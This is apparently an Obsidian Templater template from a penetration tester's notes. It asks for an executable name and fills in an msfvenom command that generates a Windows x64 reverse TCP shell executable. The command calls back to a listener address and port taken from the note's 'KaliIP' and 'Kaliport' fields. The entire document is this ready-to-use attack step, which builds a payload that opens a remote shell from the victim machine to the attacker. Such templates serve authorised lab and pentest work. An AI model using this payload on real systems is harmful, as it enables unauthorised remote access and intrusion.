<%*
let executable = await tp.system.prompt("Enter the name of the executable")
-%>

- Generate the payload <% executable %>

>[!example]   msfvenom Windows
>```shell
> msfvenom -p windows/x64/shell_reverse_tcp  LHOST=<% tp.frontmatter["KaliIP"] %> LPORT=<% tp.frontmatter["Kaliport"] %> -f exe -o <% executable %>.exe
>```
